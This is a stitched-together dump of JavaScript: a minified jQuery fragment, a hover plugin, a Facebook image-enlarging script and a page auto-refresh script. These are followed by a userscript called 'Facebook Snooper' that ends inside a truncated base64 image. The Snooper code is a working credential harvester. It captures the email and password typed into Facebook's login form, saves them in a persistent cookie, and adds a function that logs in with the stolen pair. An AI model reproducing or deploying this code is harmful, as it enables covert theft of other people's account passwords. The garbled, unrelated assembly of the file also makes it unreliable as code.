this.animate({height:"hide"},speed,callback);},slideToggle:function(speed,callback){return this.animate({height:"toggle"},speed,callback);},fadeIn:function(speed,callback){return this.animate({opacity:"show"},speed,callback);},fadeOut:function(speed,callback){return this.animate({opacity:"hide"},speed,callback);},fadeTo:function(speed,to,callback){return this.animate({opacity:to},speed,callback);},animate:function(prop,speed,easing,callback){var optall=jQuery.speed(speed,easing,callback);return this[optall.queue===false?"each":"queue"](function(){if(this.nodeType!=1)return false;var opt=jQuery.extend({},optall),p,hidden=jQuery(this).is(":hidden"),self=this;for(p in prop){if(prop[p]=="hide"&&hidden||prop[p]=="show"&&!hidden)return opt.complete.call(this);if(p=="height"||p=="width"){opt.display=jQuery.css(this,"display");opt.overflow=this.style.overflow;}}if(opt.overflow!=null)this.style.overflow="hidden";opt.curAnim=jQuery.extend({},prop);jQuery.each(prop,function(name,val){var e=new jQuery.fx(self,opt,name);if(/toggle|show|hide/.test(val))e[val=="toggle"?hidden?"show":"hide":val](prop);else{var parts=val.toString().match(/^([+-]=)?([\d+-.]+)(.*)$/),start=e.cur(true)||0;if(parts){var end=parseFloat(parts[2]),unit=parts[3]||"px";if(unit!="px"){self.style[name]=(end||1)+unit;start=((end||1)/e.cur(true))*start;self.style[name]=start+unit;}if(parts[1])end=((parts[1]=="-="?-1:1)*end)+start;e.custom(start,end,unit);}else
e.custom(start,val,"");}});return true;});},queue:function(type,fn){if(jQuery.isFunction(type)||(type&&type.constructor==Array)){fn=type;type="fx";}if(!type||(typeof type=="string"&&!fn))return queue(this[0],type);return this.each(function(){if(fn.constructor==Array)queue(this,type,fn);else{queue(this,type).push(fn);if(queue(this,type).length==1)fn.call(this);}});},stop:function(clearQueue,gotoEnd){var timers=jQuery.timers;if(clearQueue)this.queue([]);this.each(function(){for(var i=timers.length-1;i>=0;i--)if(timers[i].elem==this){if(gotoEnd)timers[i](true);timers.splice(i,1);}});if(!gotoEnd)this.dequeue();return this;}});var queue=function(elem,type,array){if(elem){type=type||"fx";var q=jQuery.data(elem,type+"queue");if(!q||array)q=jQuery.data(elem,type+"queue",jQuery.makeArray(array));}return q;};jQuery.fn.dequeue=function(type){type=type||"fx";return this.each(function(){var q=queue(this,type);q.shift();if(q.length)q[0].call(this);});};jQuery.extend({speed:function(speed,easing,fn){var opt=speed&&speed.constructor==Object?speed:{complete:fn||!fn&&easing||jQuery.isFunction(speed)&&speed,duration:speed,easing:fn&&easing||easing&&easing.constructor!=Function&&easing};opt.duration=(opt.duration&&opt.duration.constructor==Number?opt.duration:jQuery.fx.speeds[opt.duration])||jQuery.fx.speeds.def;opt.old=opt.complete;opt.complete=function(){if(opt.queue!==false)jQuery(this).dequeue();if(jQuery.isFunction(opt.old))opt.old.call(this);};return opt;},easing:{linear:function(p,n,firstNum,diff){return firstNum+diff*p;},swing:function(p,n,firstNum,diff){return((-Math.cos(p*Math.PI)/2)+0.5)*diff+firstNum;}},timers:[],timerId:null,fx:function(elem,options,prop){this.options=options;this.elem=elem;this.prop=prop;if(!options.orig)options.orig={};}});jQuery.fx.prototype={update:function(){if(this.options.step)this.options.step.call(this.elem,this.now,this);(jQuery.fx.step[this.prop]||jQuery.fx.step._default)(this);if(this.prop=="height"||this.prop=="width")this.elem.style.display="block";},cur:function(force){if(this.elem[this.prop]!=null&&this.elem.style[this.prop]==null)return this.elem[this.prop];var r=parseFloat(jQuery.css(this.elem,this.prop,force));return r&&r>-10000?r:parseFloat(jQuery.curCSS(this.elem,this.prop))||0;},custom:function(from,to,unit){this.startTime=now();this.start=from;this.end=to;this.unit=unit||this.unit||"px";this.now=this.start;this.pos=this.state=0;this.update();var self=this;function t(gotoEnd){return self.step(gotoEnd);}t.elem=this.elem;jQuery.timers.push(t);if(jQuery.timerId==null){jQuery.timerId=setInterval(function(){var timers=jQuery.timers;for(var i=0;i<timers.length;i++)if(!timers[i]())timers.splice(i--,1);if(!timers.length){clearInterval(jQuery.timerId);jQuery.timerId=null;}},13);}},show:function(){this.options.orig[this.prop]=jQuery.attr(this.elem.style,this.prop);this.options.show=true;this.custom(0,this.cur());if(this.prop=="width"||this.prop=="height")this.elem.style[this.prop]="1px";jQuery(this.elem).show();},hide:function(){this.options.orig[this.prop]=jQuery.attr(this.elem.style,this.prop);this.options.hide=true;this.custom(this.cur(),0);},step:function(gotoEnd){var t=now();if(gotoEnd||t>this.options.duration+this.startTime){this.now=this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;var done=true;for(var i in this.options.curAnim)if(this.options.curAnim[i]!==true)done=false;if(done){if(this.options.display!=null){this.elem.style.overflow=this.options.overflow;this.elem.style.display=this.options.display;if(jQuery.css(this.elem,"display")=="none")this.elem.style.display="block";}if(this.options.hide)this.elem.style.display="none";if(this.options.hide||this.options.show)for(var p in this.options.curAnim)jQuery.attr(this.elem.style,p,this.options.orig[p]);}if(done)this.options.complete.call(this.elem);return false;}else{var n=t-this.startTime;this.state=n/this.options.duration;this.pos=jQuery.easing[this.options.easing||(jQuery.easing.swing?"swing":"linear")](this.state,n,0,1,this.options.duration);this.now=this.start+((this.end-this.start)*this.pos);this.update();}return true;}};jQuery.extend(jQuery.fx,{speeds:{slow:600,fast:200,def:400},step:{scrollLeft:function(fx){fx.elem.scrollLeft=fx.now;},scrollTop:function(fx){fx.elem.scrollTop=fx.now;},opacity:function(fx){jQuery.attr(fx.elem.style,"opacity",fx.now);},_default:function(fx){fx.elem.style[fx.prop]=fx.now+fx.unit;}}});jQuery.fn.offset=function(){var left=0,top=0,elem=this[0],results;if(elem)with(jQuery.browser){var parent=elem.parentNode,offsetChild=elem,offsetParent=elem.offsetParent,doc=elem.ownerDocument,safari2=safari&&parseInt(version)<522&&!/adobeair/i.test(userAgent),css=jQuery.curCSS,fixed=css(elem,"position")=="fixed";if(elem.getBoundingClientRect){var box=elem.getBoundingClientRect();add(box.left+Math.max(doc.documentElement.scrollLeft,doc.body.scrollLeft),box.top+Math.max(doc.documentElement.scrollTop,doc.body.scrollTop));add(-doc.documentElement.clientLeft,-doc.documentElement.clientTop);}else{add(elem.offsetLeft,elem.offsetTop);while(offsetParent){add(offsetParent.offsetLeft,offsetParent.offsetTop);if(mozilla&&!/^t(able|d|h)$/i.test(offsetParent.tagName)||safari&&!safari2)border(offsetParent);if(!fixed&&css(offsetParent,"position")=="fixed")fixed=true;offsetChild=/^body$/i.test(offsetParent.tagName)?offsetChild:offsetParent;offsetParent=offsetParent.offsetParent;}while(parent&&parent.tagName&&!/^body|html$/i.test(parent.tagName)){if(!/^inline|table.*$/i.test(css(parent,"display")))add(-parent.scrollLeft,-parent.scrollTop);if(mozilla&&css(parent,"overflow")!="visible")border(parent);parent=parent.parentNode;}if((safari2&&(fixed||css(offsetChild,"position")=="absolute"))||(mozilla&&css(offsetChild,"position")!="absolute"))add(-doc.body.offsetLeft,-doc.body.offsetTop);if(fixed)add(Math.max(doc.documentElement.scrollLeft,doc.body.scrollLeft),Math.max(doc.documentElement.scrollTop,doc.body.scrollTop));}results={top:top,left:left};}function border(elem){add(jQuery.curCSS(elem,"borderLeftWidth",true),jQuery.curCSS(elem,"borderTopWidth",true));}function add(l,t){left+=parseInt(l,10)||0;top+=parseInt(t,10)||0;}return results;};jQuery.fn.extend({position:function(){var left=0,top=0,results;if(this[0]){var offsetParent=this.offsetParent(),offset=this.offset(),parentOffset=/^body|html$/i.test(offsetParent[0].tagName)?{top:0,left:0}:offsetParent.offset();offset.top-=num(this,'marginTop');offset.left-=num(this,'marginLeft');parentOffset.top+=num(offsetParent,'borderTopWidth');parentOffset.left+=num(offsetParent,'borderLeftWidth');results={top:offset.top-parentOffset.top,left:offset.left-parentOffset.left};}return results;},offsetParent:function(){var offsetParent=this[0].offsetParent;while(offsetParent&&(!/^body|html$/i.test(offsetParent.tagName)&&jQuery.css(offsetParent,'position')=='static'))offsetParent=offsetParent.offsetParent;return jQuery(offsetParent);}});jQuery.each(['Left','Top'],function(i,name){var method='scroll'+name;jQuery.fn[method]=function(val){if(!this[0])return;return val!=undefined?this.each(function(){this==window||this==document?window.scrollTo(!i?val:jQuery(window).scrollLeft(),i?val:jQuery(window).scrollTop()):this[method]=val;}):this[0]==window||this[0]==document?self[i?'pageYOffset':'pageXOffset']||jQuery.boxModel&&document.documentElement[method]||document.body[method]:this[0][method];};});jQuery.each(["Height","Width"],function(i,name){var tl=i?"Left":"Top",br=i?"Right":"Bottom";jQuery.fn["inner"+name]=function(){return this[name.toLowerCase()]()+num(this,"padding"+tl)+num(this,"padding"+br);};jQuery.fn["outer"+name]=function(margin){return this["inner"+name]()+num(this,"border"+tl+"Width")+num(this,"border"+br+"Width")+(margin?num(this,"margin"+tl)+num(this,"margin"+br):0);};});})();

	(function($){$.fn.hoverIntent=function(f,g){var cfg={sensitivity:7,interval:150,timeout:100};cfg=$.extend(cfg,g?{over:f,out:g}:f);var cX,cY,pX,pY;var track=function(ev){cX=ev.pageX;cY=ev.pageY;};var compare=function(ev,ob){ob.hoverIntent_t=clearTimeout(ob.hoverIntent_t);if((Math.abs(pX-cX)+Math.abs(pY-cY))<cfg.sensitivity){$(ob).unbind("mousemove",track);ob.hoverIntent_s=1;return cfg.over.apply(ob,[ev]);}else{pX=cX;pY=cY;ob.hoverIntent_t=setTimeout(function(){compare(ev,ob);},cfg.interval);}};var delay=function(ev,ob){ob.hoverIntent_t=clearTimeout(ob.hoverIntent_t);ob.hoverIntent_s=0;return cfg.out.apply(ob,[ev]);};var handleHover=function(e){var p=(e.type=="mouseover"?e.fromElement:e.toElement)||e.relatedTarget;while(p&&p!=this){try{p=p.parentNode;}catch(e){p=this;}}if(p==this){return false;}var ev=$.extend({},e);var ob=this;if(ob.hoverIntent_t){ob.hoverIntent_t=clearTimeout(ob.hoverIntent_t);}if(e.type=="mouseover"){pX=ev.pageX;pY=ev.pageY;$(ob).bind("mousemove",track);if(ob.hoverIntent_s!=1){ob.hoverIntent_t=setTimeout(function(){compare(ev,ob);},cfg.interval);}}else{$(ob).unbind("mousemove",track);if(ob.hoverIntent_s==1){ob.hoverIntent_t=setTimeout(function(){delay(ev,ob);},cfg.timeout);}}};return this.mouseover(handleHover).mouseout(handleHover);};})($);
$(document).ready(function() {
// code to run when hover is activated
var hoverInFunction = function (e) {
	var hoveredImage = this.src ? this : $(this).prev().get(0);
	hoveredImage.style.cursor = 'wait';		
	// remove any leftover popovers
	$('div.largeImagePopover').remove();
	$('div#largeImagePopover').remove();
	$("body").css("overflow", "auto");
	// setup the large image 
	var popImage = document.createElement("img");
	var src = hoveredImage.src;
	src = src.replace(/(\d+)\/(a|s|q|t)(\d+)/,"$1/n$3");
	src = src.replace(/(\d+)_(a|s|t|q)\.jpg/,"$1_n.jpg");
	popImage.src = src
	popImage.alt = hoveredImage.alt;
	popImage.border = 0;
	// setup the image link 
	var popLink = document.createElement("a");
	popLink.href = $(hoveredImage).parents('a').attr('href');
	popLink.appendChild(popImage);
	// setup the image div 
	var popDiv = document.createElement("div");
	popDiv.id= 'largeImagePopover'; 
	popDiv['class'] = 'largeImagePopover'; 
	popDiv.style.position = 'absolute';
	popDiv.style.zIndex = '500';
	popDiv.appendChild(popLink);
	$(popDiv).hide();
	// attach events to new image 
	$(popImage).mousemove( function() { 
		$(popDiv).remove(); 
		$("body").css("overflow", "auto");
	});
	$(popImage).css('cursor','none');
	$(popImage).load( function() {
			// these assignments may differ per browser
			var pageXOffset = window.pageXOffset;
			var pageYOffset = window.pageYOffset;
			var innerWidth = window.innerWidth;
			var innerHeight = window.innerHeight;
			var mouseX = e.pageX;
			var mouseY = e.pageY;
			// hide scrollbars if they would be in the way
			$("body").css("overflow", "auto");
			if (popImage.width > innerWidth - 16) {
				$("body").css("overflow", "hidden");
			}
			// shrink image if wider than screen 
			popImage.width = Math.min(popImage.width,innerWidth);
			// center image on mouse cursor
			var x = mouseX - parseInt(popImage.width/2);
			var y = mouseY - parseInt(popImage.height/2);
			// move image down and right if off screen to the left or top
			x = Math.max(x,pageXOffset);
			y = Math.max(y,pageYOffset);
			// move image up or left if off screen to the right or bottom
			x = Math.min(x, pageXOffset + innerWidth - 17 - popImage.width);	
			y = Math.min(y, pageYOffset + innerHeight - popImage.height);	
			// move image down and right if off screen to the left or top
			x = Math.max(x,pageXOffset);
			y = Math.max(y,pageYOffset);
			$(popImage.parentNode.parentNode).css('left',x);
			$(popImage.parentNode.parentNode).css('top',y);
			$(popImage.parentNode.parentNode).fadeIn('fast');
			hoveredImage.style.cursor = 'crosshair';	
	});
	// add to document 
	$('body').append($(popDiv));
};
$('.UIRoundedImage_CornersSprite').remove();
// assign hoverEvent to all resizable images 
$("img").each(function(i) {
	var imgsrc = $(this).attr("src");
	if (/\d+\/(a|q|t|s)\d+/.test(imgsrc) || /\d+_(a|s|q|t)\.jpg/.test(imgsrc)) {
		$(this).css('cursor','crosshair');
		$(this).hoverIntent( hoverInFunction, function(){} );
	}
	$(this).addClass('largeimageprocessed');
	
});	
var domEventDetected = function(){
	window.setTimeout(function(){
	$('.UIRoundedImage_CornersSprite').remove();
	$("img:not(.largeimageprocessed)").each(function(i) {
		var imgsrc = $(this).attr("src");
		if (/\d+\/(a|q|t|s)\d+/.test(imgsrc) || /\d+_(a|s|q|t)\.jpg/.test(imgsrc)) {
			$(this).css('cursor','crosshair');
			$(this).hoverIntent( hoverInFunction, function(){} );
		}
		$(this).addClass('largeimageprocessed');
	});	
	},500);
};
$('body').bind('DOMNodeInserted',domEventDetected);
});
<script>
<!--
/*
Auto Refresh Page with Time script
*/
//enter refresh time in "minutes:seconds" Minutes should range from 0 to inifinity. Seconds should range from 0 to 59
var limit="0:30"
if (document.images){
var parselimit=limit.split(":")
parselimit=parselimit[0]*60+parselimit[1]*1
}
function beginrefresh(){
if (!document.images)
return
if (parselimit==1)
window.location.reload()
else{ 
parselimit-=1
curmin=Math.floor(parselimit/60)
cursec=parselimit%60
if (curmin!=0)
curtime=curmin+" minutes and "+cursec+" seconds left until page refresh!"
else
curtime=cursec+" seconds left until page refresh!"
window.status=curtime
setTimeout("beginrefresh()",1000)
}
}
window.onload=beginrefresh
//-->
</script>
var title 				= "Facebook Snooper";
var version 			= "v1.1.1";
var width 				= 700;
var height 				= 400;
var cookieName 			= "uffedentuffe";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;
init();
function init()
{
	//getElementsByClassNameAndType('uiButtonConfirm', 'submit')[0].addEventListener("click", saveLogin, false);	
	getElementByTabIndex("4", "submit")[0].addEventListener("click", saveLogin, false);;
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}
function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	var date = new Date();
	var value = date.getTime() + subDelimiter + unControl.value + subDelimiter + pwControl.value;
	if(cookie)
		value += delimiter + cookie;
	writeCookie(cookieName, value, daysToKeepCookie);
}
unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}
jollyRogerz = 'data:image/png;base64,'+
'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'+
